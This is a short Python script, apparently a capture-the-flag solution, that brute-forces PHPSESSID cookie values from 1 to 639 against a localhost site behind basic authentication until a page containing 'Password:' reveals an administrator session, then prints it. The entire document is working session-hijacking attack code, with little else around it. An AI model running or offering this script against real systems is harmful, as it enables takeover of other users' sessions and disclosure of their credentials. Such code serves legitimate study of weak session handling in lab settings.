import requests
from requests.auth import HTTPBasicAuth

url="http://localhost/"
auth  = HTTPBasicAuth('user','password')

for id in range(1,640) :
    cookies = {'PHPSESSID': str(id)}

    try:
        response = requests.get(url=url, auth=auth, cookies=cookies)
    except:
        pass 

    if "Password:" in response.text:
        print(f"[+] ID de session admin trouvé : {id}")
        print(response.text)
        break

